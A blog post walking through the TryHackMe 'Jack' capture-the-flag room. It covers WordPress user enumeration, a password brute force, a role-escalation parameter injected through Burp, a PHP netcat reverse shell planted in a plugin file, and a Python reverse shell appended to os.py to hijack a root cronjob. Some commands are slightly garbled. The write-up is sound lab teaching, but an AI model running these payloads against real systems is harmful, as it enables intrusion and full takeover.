::: {}
# TryHackme --- Jack Write up {#tryhackme-jack-write-up .p-name}
:::

::: {.section .p-summary field="subtitle"}
https://tryhackme.com/room/jack
:::

::::::: {.section .e-content field="body"}
:::::: {#6d82 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### TryHackme --- Jack Write up {#f536 .graf .graf--h3 .graf--leading .graf--title name="f536"}

<figure id="d011" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*OJvwZ89fRYR92TM0.png"
class="graf-image" data-image-id="0*OJvwZ89fRYR92TM0.png"
data-width="875" data-height="127" />
</figure>

[https://tryhackme.com/room/jack](https://tryhackme.com/room/jack){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/jack"
rel="noopener ugc nofollow noopener" target="_blank"}

### Setup {#009b .graf .graf--h3 .graf-after--p name="009b"}

First, we will connect to the VPN. If you are not familiar with the
process go through this
[room](https://tryhackme.com/room/openvpn){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/openvpn"
rel="noopener ugc nofollow noopener" target="_blank"}

Once we are connected we will deploy the machine ***(note that in the
room description there is a request for you to add jack.thm to
/etc/hosts):***

Let's add **jack.thm** to the **/etc/hosts** file you can use leafpad or
vim for edit this file

<figure id="ef6e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*L22onABVqvAd_wom.png"
class="graf-image" data-image-id="0*L22onABVqvAd_wom.png"
data-width="412" data-height="131" />
</figure>

### Enumeration {#919e .graf .graf--h3 .graf-after--figure name="919e"}

``` {#5d0d .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
nmap -T4 -sS -sC -sV jack.thm
```

<figure id="f367" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*v4hMYOGDr59LOCO-.png"
class="graf-image" data-image-id="0*v4hMYOGDr59LOCO-.png"
data-width="784" data-height="298" />
</figure>

We have Two Ports SSH =21 and HTTP=80 without username and password we
can't login through SSH. So Enumerate Port 80 Open Browser and search

``` {#845a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
http://jack.thm
```

<figure id="c9dc" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*7qZC56gf7khTceD3.png"
class="graf-image" data-image-id="0*7qZC56gf7khTceD3.png"
data-width="875" data-height="464" />
</figure>

From the **nmap** results, we can see the **/wp-admin** in the results
which takes us to the WordPress login form, but we don't have any
credentials yet.

<figure id="7688" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*W0cS1vmIj-sgRHfF.png"
class="graf-image" data-image-id="0*W0cS1vmIj-sgRHfF.png"
data-width="696" data-height="458" />
</figure>

### Using WPScan {#7a17 .graf .graf--h3 .graf-after--figure name="7a17"}

``` {#51ac .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
wpscan - url jack.thm -e u
```

<figure id="43c7" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*9MpWXGr1zf98XqSm.png"
class="graf-image" data-image-id="0*9MpWXGr1zf98XqSm.png"
data-width="785" data-height="158" />
</figure>

We can see XML-RPS is enabled which gives us few vulnerabilities A blog
post
[**here**](https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32"
rel="noopener" target="_blank"} by [+Bilal
Rizwan](https://medium.com/u/e44ee7c04069?source=post_page-----1b1530b54f1e--------------------------------){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/u/e44ee7c04069?source=post_page-----1b1530b54f1e--------------------------------"
rel="noopener" target="_blank"}

**Users Found**

<figure id="60fa" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*TqQoty1_WN3DaIJQ.png"
class="graf-image" data-image-id="0*TqQoty1_WN3DaIJQ.png"
data-width="742" data-height="355" />
</figure>

With WPScan we know that the server is running **WordPress 5.3.2** with
**XML-RPC enabled** and has three users. With this information we will
move on to exploiting WordPress.

### Brute Force WordPress Login {#6fc7 .graf .graf--h3 .graf-after--p name="6fc7"}

We paste all three users in text file

``` {#4783 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
echo user1 > users.txt;echo user2 >> users.txt;echo user3 >> users.txt#wpscan -U users.txt -P rockyou.txt - url http://jack.thm
```

<figure id="08f6" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*EZGxI4bo1Uo3mZxA.png"
class="graf-image" data-image-id="0*EZGxI4bo1Uo3mZxA.png"
data-width="673" data-height="324" />
</figure>

We have a valid username and password login to WordPress.

<figure id="7ac0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*SOMYFj72yTHrHK13.png"
class="graf-image" data-image-id="0*SOMYFj72yTHrHK13.png"
data-width="875" data-height="621" />
</figure>

At this point, I had to take a hint, because there were **no plugins
found via wpscan,** and **this user wasn't** an admin user, So We will
use Searchsploit

``` {#3e31 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
searchsploit Plugin User role editor
```

<figure id="dc0f" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Ljof_HubQ_Gxxbkn.png"
class="graf-image" data-image-id="0*Ljof_HubQ_Gxxbkn.png"
data-width="690" data-height="186" />
</figure>

### Download exploit {#dbc0 .graf .graf--h3 .graf-after--figure name="dbc0"}

``` {#f0cb .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
searchsploit -m 44595
```

This exploit tells that send a modified post request specifying the
users privileges using ***ure_other_roles*** as part of updating a users
profile

<figure id="1c5b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*dvz7fqFLah-fz8qZ.png"
class="graf-image" data-image-id="0*dvz7fqFLah-fz8qZ.png"
data-width="780" data-height="562" />
</figure>

open **Burp Suite**, set the **proxy** on your browser and **turn on
intercept**:

<figure id="8a81" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*T2YIGIYRL_Y39q6z.png"
class="graf-image" data-image-id="0*T2YIGIYRL_Y39q6z.png"
data-width="725" data-height="355" />
</figure>

We can see that the section of the post request that may be vulnerable:

Now Compare this to the ruby module we download using searchsploit we
can see that all parameter in the post request are set except for
***ure_other_roles***:

<figure id="3693" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*qDJV3SWFjpZ87qWi.png"
class="graf-image" data-image-id="0*qDJV3SWFjpZ87qWi.png"
data-width="714" data-height="572" />
</figure>

So, let's try adding this to our request and see if it does work:

``` {#403c .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
&ure_other_roles=administrator
```

We modify our request and click forward in Burp:

<figure id="7074" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*zlFpmdHJaYzt9ozP.png"
class="graf-image" data-image-id="0*zlFpmdHJaYzt9ozP.png"
data-width="730" data-height="357" />
</figure>

When We forward our request . We have administrator access to WordPress
and we can see under the plugins tab the vulnerable User Role Editor
Plugin Version 4.24:

<figure id="db9a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*v5zaLDMgHfORhRji.png"
class="graf-image" data-image-id="0*v5zaLDMgHfORhRji.png"
data-width="875" data-height="534" />
</figure>

**Getting a Shell**

Go to plugin editor and paste this one linear code in Akismet.php

``` {#7a9a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="php"}
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.X.X 4444 >/tmp/f") ?>
```

<figure id="fa61" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*U2rWda7Hn2zDABxB.png"
class="graf-image" data-image-id="0*U2rWda7Hn2zDABxB.png"
data-width="875" data-height="436" />
</figure>

now click on update file

<figure id="424e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*mrezZZlanhuvclTM.png"
class="graf-image" data-image-id="0*mrezZZlanhuvclTM.png"
data-width="852" data-height="289" />
</figure>

now click on Activate to get reverse-shell

We start our Listener

<figure id="de1c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*d-fSbsuOg3jyvhOr.png"
class="graf-image" data-image-id="0*d-fSbsuOg3jyvhOr.png"
data-width="672" data-height="400" />
</figure>

We have user **www-data** ,which has low privilege. We need to Escalate
user jack .Checking out the reminder.txt file, we noticed something
related to backups, so we do some enumeration and find a backups folder
with an ssh key which we can use to login as jack.

List of files under **/var/backups**

<figure id="6eb7" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Oy67XxwC7L0LhuAX.png"
class="graf-image" data-image-id="0*Oy67XxwC7L0LhuAX.png"
data-width="735" data-height="428" />
</figure>

We can login as user jack after changing the permissions of the id_rsa
to 600

Then we try SSH:

``` {#5a7a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
ssh -i id_rsa jack@jack.thm
```

<figure id="27ae" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*SszJH_eKLwtyuJHy.png"
class="graf-image" data-image-id="0*SszJH_eKLwtyuJHy.png"
data-width="875" data-height="450" />
</figure>

**User.txt**

<figure id="80ad" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*q7KTdCAu_coUcw_A.png"
class="graf-image" data-image-id="0*q7KTdCAu_coUcw_A.png"
data-width="587" data-height="189" />
</figure>

### Privilege Escalation to Root {#6b9b .graf .graf--h3 .graf-after--figure name="6b9b"}

Download
[**pspy64**](https://github.com/wildkindcc/Exploitation/blob/master/00.PostExp_Linux/pspy/pspy64){.markup--anchor
.markup--p-anchor
data-href="https://github.com/wildkindcc/Exploitation/blob/master/00.PostExp_Linux/pspy/pspy64"
rel="noopener ugc nofollow noopener" target="_blank"}

``` {#a060 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
wget https://github.com/wildkindcc/Exploitation/blob/master/00.PostExp_Linux/pspy/pspy64
```

Transfer this file into jack's **/tmp** folder to run

Using
[**pspy**](https://github.com/wildkindcc/Exploitation/blob/master/00.PostExp_Linux/pspy/pspy64){.markup--anchor
.markup--p-anchor
data-href="https://github.com/wildkindcc/Exploitation/blob/master/00.PostExp_Linux/pspy/pspy64"
rel="noopener ugc nofollow noopener" target="_blank"} to monitor the
processes that are running, we notice that root has a cronjob running
every minute. The script is located at **/opt/statuscheck/checker.py**

<figure id="cf24" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Qfvpvjxsiv_jxY_-.png"
class="graf-image" data-image-id="0*Qfvpvjxsiv_jxY_-.png"
data-width="875" data-height="131" />
</figure>

The contents of the script shows that it imports the python module
**os**

<figure id="3c39" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*rrCIkXpl-aMKTFIu.png"
class="graf-image" data-image-id="0*rrCIkXpl-aMKTFIu.png"
data-width="816" data-height="224" />
</figure>

With all that information we discovered, it's time to do some further
enumeration. We noticed that the user **jack** is part of the **family
group** which has the ability to write on any files under the
**/usr/lib/python2.7/** directory. This is good because the **os**
module is under that directory and our user jack has write access to
that module.

``` {#26e3 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ruby"}
www-data@jack:/home/jack$ id jack
id jack
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)
```

<figure id="e5ea" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Q1-VL1ghcZ5pRWAb.png"
class="graf-image" data-image-id="0*Q1-VL1ghcZ5pRWAb.png"
data-width="875" data-height="214" />
</figure>

To exploit this, we edit the **/usr/lib/python2.7/os.py** module and add
the following reverse shell all the way at the end

``` {#7e0e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="go"}
import socket
import ptys=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.X.X", 4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```

<figure id="24c6" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*17Tk5E0a1261B6A-.png"
class="graf-image" data-image-id="0*17Tk5E0a1261B6A-.png"
data-width="627" data-height="408" />
</figure>

We start a listener and wait 2 minute for the cronjob to run, and we get
a root shell.

<figure id="bcb2" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*SshSDoepd3HL1BMe.png"
class="graf-image" data-image-id="0*SshSDoepd3HL1BMe.png"
data-width="658" data-height="279" />
</figure>

Thanks to the machine creator/s for this challenge.

### Promote and Collaborate on Cybersecurity Insights {#bfc2 .graf .graf--h3 .graf-after--p name="bfc2"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#cec6 .graf .graf--h3 .graf-after--p name="cec6"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [September 6, 2024](https://medium.com/p/fab8279fb15d).

[Canonical
link](https://medium.com/@bevijaygupta/tryhackme-jack-write-up-fab8279fb15d){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
